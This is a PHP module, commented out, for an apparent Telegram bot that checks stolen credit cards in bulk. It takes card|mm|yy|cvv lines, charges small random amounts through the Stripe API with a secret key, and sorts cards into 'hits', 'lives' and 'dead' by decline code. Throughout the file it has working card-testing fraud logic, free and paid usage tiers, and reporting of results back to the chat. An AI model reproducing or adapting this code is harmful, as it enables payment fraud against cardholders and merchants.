<?php
/*include __DIR__."/../config/variables.php";
include __DIR__."/../config/users.php";
include __DIR__."/../functions/bot.php";
include __DIR__."/../functions/functions.php";
include __DIR__."/../Modules/Others/sk.php";

if ((strpos($message, "/mchk") === 0)||(strpos($message, "!mchk") === 0)||(strpos($message, ".mchk") === 0)){
    if(!in_array($chat_id, $auchats)){
        if($plan == 'free'){
            bot('sendmessage',[
            'chat_id'=>$chat_id,
            'text'=>"<b>Not Authorised. Join <a href='t.me/DarkxxChat'>Here</a> To Use Free Gates</b>",
            'parse_mode'=>'html',
            'reply_to_message_id'=> $message_id
            ]);
            return;
        }
    };
    if($plan == 'free'){
        $limit = 5;
    }
    else{
        $limit = 15;
    }



$message = substr($message, 6);
$messageidtoedit1 = bot('sendmessage',[
    'chat_id'=>$chat_id,
    'text'=>"<b>Wait for Result...</b>",
    'parse_mode'=>'html',
    'reply_to_message_id'=> $message_id
]);
$lists = array_unique(explode("\n", $message));
$messageidtoedit = Getstr(json_encode($messageidtoedit1), '"message_id":', ',');

$hits = 0;
$li = 0;
$tot = count($lists);
$ded = 0;
$un = 0;
  if($tot > $limit){
    bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtoedit,
            'text'=>"Max $limit ccs",
            'parse_mode'=>'html',
            'disable_web_page_preview'=>'true'
            ]);
    return;
  }
  foreach ($lists as $messagee){

$cc = multiexplode(array(":", "/", " ", "|"), $messagee)[0];
$mes = multiexplode(array(":", "/", " ", "|"), $messagee)[1];
$ano = multiexplode(array(":", "/", " ", "|"), $messagee)[2];
$cvv = multiexplode(array(":", "/", " ", "|"), $messagee)[3];
$amt = ''.randomamt(1).'';
if(empty($cc)||empty($cvv)||empty($mes)||empty($ano)){
    bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtoedit,
            'text'=>"Invalid details \nFormat -> cc|mm|yy|cvv",
            'parse_mode'=>'html',
            'disable_web_page_preview'=>'true'
            ]);
    return;
};
        $amount = $amt * 100;
      $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
        curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'&billing_details[address][line1]=36&billing_details[address][line2]=Regent Street&billing_details[address][city]=Jamestown&billing_details[address][postal_code]=14701&billing_details[address][state]=New York&billing_details[address][country]=US&billing_details[email]='.$mail.'@gmail.com&billing_details[name]=@Op_s0ul Mittal');
        $result1 = curl_exec($ch);
        $tok1 = Getstr($result1,'"id": "','"');
        $msg1 = Getstr($result1,'"message": "','"');
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents');
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
        curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount='.$amount.'&currency=usd&payment_method_types[]=card&description=Op_s0ul Donation&payment_method='.$tok1.'&confirm=true&off_session=true');
        $result2 = curl_exec($ch);
        $msg2 = Getstr($result2,'"message": "','"');
        $rcp = trim(strip_tags(getStr($result2,'"receipt_url": "','"')));


    
//--------Responses--------//
    if(strpos($result2, '"seller_message": "Payment complete."' )) {
        file_put_contents('hits.txt', "<b>Card ➔ <code>$messagee</code>\nResponse ➔ Successfully Charged $$amt ✅ <a href='t.me/DarkxUpdate'>𝘿𝙖𝙍𝙠𝙨𝙊𝙡</a>\n\n</b>", FILE_APPEND);
      $hits++;}
      
    elseif(strpos($result2, "insufficient_funds" )) {
      file_put_contents('hits.txt', "<b>Card ➔ <code>$messagee</code>\nResponse ➔ Insufficient Funds $$amt ✅ <a href='t.me/DarkxUpdate'>𝘿𝙖𝙍𝙠𝙨𝙊𝙡</a>\n\n</b>", FILE_APPEND);
      $hits++;}

    elseif ((strpos($result1, "card_error_authentication_required")) || (strpos($result2, "card_error_authentication_required"))){
      file_put_contents('lives.txt', "<b>Card ➔ <code>$messagee</code>\nResponse ➔ 3D Card $$amt ✅ <a href='t.me/DarkxUpdate'>𝘿𝙖𝙍𝙠𝙨𝙊𝙡</a>\n\n</b>", FILE_APPEND);
      $li++;}
    elseif(strpos($result2,'"cvc_check": "pass"')){
      file_put_contents('lives.txt', "<b>Card ➔ <code>$messagee</code>\nResponse ➔ Payment Cannot Be Completed $$amt ✅ <a href='t.me/DarkxUpdate'>𝘿𝙖𝙍𝙠𝙨𝙊𝙡</a>\n\n</b>", FILE_APPEND);
      $li++;}
      
    elseif(strpos($result2,'"code": "incorrect_cvc"')){
      file_put_contents('lives.txt', "<b>Card ➔ <code>$messagee</code>\nResponse ➔ Incorrect CVV $$amt ✅ <a href='t.me/DarkxUpdate'>𝘿𝙖𝙍𝙠𝙨𝙊𝙡</a>\n\n</b>", FILE_APPEND);
      $li++;}

    elseif ((strpos($result1, "transaction_not_allowed")) || (strpos($result2, "transaction_not_allowed"))){
      file_put_contents('lives.txt', "<b>Card ➔ <code>$messagee</code>\nResponse ➔ Transaction Not Allowed $$amt ✅ <a href='t.me/DarkxUpdate'>𝘿𝙖𝙍𝙠𝙨𝙊𝙡</a>\n\n</b>", FILE_APPEND);
      $li++;}

      elseif ((strpos($result1, "fraudulent")) || (strpos($result2, "fraudulent"))){$ded++;}
      elseif ((strpos($result1, "expired_card")) || (strpos($result2, "expired_card"))){$ded++;}
      elseif ((strpos($result1, "generic_declined")) || (strpos($result2, "generic_declined"))){$ded++;}
      elseif ((strpos($result1, "do_not_honor")) || (strpos($result2, "do_not_honor"))){$ded++;}
      elseif ((strpos($result1, 'rate_limit')) || (strpos($result2, 'rate_limit'))){$ded++;}
      elseif ((strpos($result1, "Your card was declined.")) || (strpos($result2, "Your card was declined."))){$ded++;}
      elseif ((strpos($result1, ' "message": "Your card number is incorrect."')) || (strpos($result2, ' "message": "Your card number is incorrect."'))){$ded++;}
      else {
          file_put_contents('unk.txt',"<b><u><i>Unknown Error. $msg1 - $msg2</i></u></b>\n\n", FILE_APPEND);
          $un++;};
  }
delMessage($chat_id,$message_id);
bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtoedit,
    'text'=>"<b>Total Card ➔ $tot
Hits ➔ $hits 
Lives ➔ $li 
Dead ➔ $ded 
Unkown ➔ $un
Bot By ➔ <a href='t.me/DarkxUpdate'>⏤͟͞𝘿à𝙍𝙠𝙨Ø𝙡 ™ </a></b>",
    'parse_mode'=>'html'
    ]);
$geet= file_get_contents('lives.txt');
$get= str_replace("\n", "%0A", $geet);
bot('sendmessage',[
    'chat_id'=>$chat_id,
    'text'=>"$geet",
    'parse_mode'=>'html'
    ]);
$hits= file_get_contents('hits.txt');
$hit= str_replace("\n", "%0A", $hits);
bot('sendmessage',[
    'chat_id'=>$chat_id,
    'text'=>"$hits",
    'parse_mode'=>'html'
    ]);
$unk= file_get_contents('unk.txt');
$unkn= str_replace("\n", "%0A", $unk);
bot('sendmessage',[
    'chat_id'=>'504392428',
    'text'=>"$unk",
    'parse_mode'=>'html'
    ]);
unlink('hits.txt');
unlink('lives.txt');
unlink('unk.txt');

return;

}*/

?>
